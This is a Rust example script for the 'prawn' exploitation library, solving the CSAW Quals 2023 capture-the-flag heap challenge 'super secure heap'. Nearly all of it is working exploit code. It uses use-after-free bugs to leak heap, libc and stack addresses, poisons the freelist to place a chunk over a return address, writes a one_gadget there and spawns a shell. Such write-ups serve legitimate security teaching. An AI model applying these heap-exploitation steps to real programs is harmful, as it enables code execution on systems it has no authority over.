/*
   prawn Example Script
   CSAW Quals 2023: "super secure heap"
*/

use prawn::tubes::process::*;
use prawn::tubes::Tube;
use prawn::util::*;

mod macros;
use crate::macros::*;

use std::error::Error;

type Result<T> = std::result::Result<T, Box<dyn Error>>;

async fn selkey(key: bool) -> Result<()> {
   if !key {
       sendlineafter!(b">", b"2")?;
   } else {
       sendlineafter!(b">", b"1")?;
   }
   Ok(())
}

async fn alloc(size: usize, key: bool) -> Result<()> {
    selkey(key).await?;
    sendline!(b"1")?;
    sendline!(&format!("{}", size).into_bytes())?;
    Ok(())
}

async fn delete(idx: usize, key: bool) -> Result<()> {
    selkey(key).await?;
    sendline!(b"2")?;
    sendline!(&format!("{}", idx).into_bytes())?;
    Ok(())
}

async fn modify(idx: usize, keyno: usize, size: usize, cont: Vec<u8>) -> Result<()> {
    selkey(false).await?;
    sendline!(b"3")?;
    sendline!(&format!("{}", idx).into_bytes())?;
    sendline!(&format!("{}", keyno).into_bytes())?;
    sendline!(&format!("{}", size).into_bytes())?;
    send!(&cont)?;
    Ok(())
}

async fn kmodify(idx: usize, size: usize, cont: Vec<u8>) -> Result<()> {
    selkey(true).await?;
    sendline!(b"3")?;
    sendline!(&format!("{}", idx).into_bytes())?;
    sendline!(&format!("{}", size).into_bytes())?;
    sendline!(&cont)?;
    Ok(())
}

async fn show(idx: usize, key: bool) -> Result<()> {
    selkey(key).await?;
    sendline!(b"4")?;
    sendline!(&format!("{}", idx).into_bytes())?;
    Ok(())
}

#[tokio::main]
async fn main() -> Result<()> {
    let cfg = ProcessConfig::default();
    *PROC.lock().await = Some(
        Process::new(["./super_secure_heap_patched"], &cfg).await?
    );

    // setup key
    let key = b"LOL";
    alloc(key.len()+1, true).await?;
    kmodify(0, key.len(), key.to_vec()).await?;

    //// uaf to leak a freelist pointer
    let heap_leak = {
        alloc(20, false).await?;
        alloc(20, false).await?;
        delete(0, false).await?;
        delete(1, false).await?;

        show(1, false).await?;

        recvuntil!(b"Here is your content:")?;
        recvline!()?;

        let mut heap_leak = recv!(6)?;
        heap_leak.append(&mut vec![0u8, 0]);
        u64(&heap_leak)?
    };
    println!("heap: {:#x}", &heap_leak);

    //// uaf to leak an arena pointer from unsorted bin consolidation
    let environ_off = 0x1ef600;
    let libc_leak = {
        alloc(0xec0, false).await?;
        alloc(0xec0, false).await?;
        delete(2, false).await?;
        delete(3, false).await?;

        show(2, false).await?;

        recvuntil!(b"Here is your content:")?;
        recvline!()?;

        let mut libc_leak = recv!(6)?;
        libc_leak.append(&mut vec![0u8, 0]);
        u64(&libc_leak)? - 0x1ecbe0
    };
    println!("libc: {:#x}", &libc_leak);

    let environ = libc_leak+environ_off;
    println!("libc environ: {:#x}", &environ);

    // hijack freelist to get an allocation on libc environ to leak stack
    let stack_leak = {
        modify(1, 0, p64(environ)?.len(), p64(environ)?).await?;

        alloc(20, false).await?;
        alloc(20, false).await?;

        show(5, false).await?;

        recvuntil!(b"Here is your content:")?;
        recvline!()?;

        let mut stack_leak = recv!(6)?;
        stack_leak.append(&mut vec![0u8, 0]);
        u64(&stack_leak)?
    };
    println!("stack: {:#x}", &stack_leak);

    // get idx 7 on the freelist
    alloc(32, false).await?;
    alloc(32, false).await?;
    delete(6, false).await?;
    delete(7, false).await?;

    // reallocate 7 as a key (keys contents won't be encrypted)
    alloc(32, true).await?;

    // free idx 7 again to create a uaf on the previous key chunk
    delete(7, false).await?;

    // overwrite the freelist pointer to get an allocation on the stack
    let return_addr = stack_leak - 0x100;
    println!("ret leak: {:#x}", &return_addr);
    kmodify(1, 8, p64(return_addr)?).await?;

    // moves hijacked chunk to top of freelist
    alloc(32, false).await?;

    // this chunk should be on top of the return addr
    alloc(32, true).await?;

    // overwrite return addr with one gadget
    let one_gadget = p64(libc_leak+0xe3b01)?;
    kmodify(2, 31, one_gadget).await?;

    // exit and get shell!
    p!().sendline(b"3").await?;
    p!().interactive().await?;
    Ok(())
}
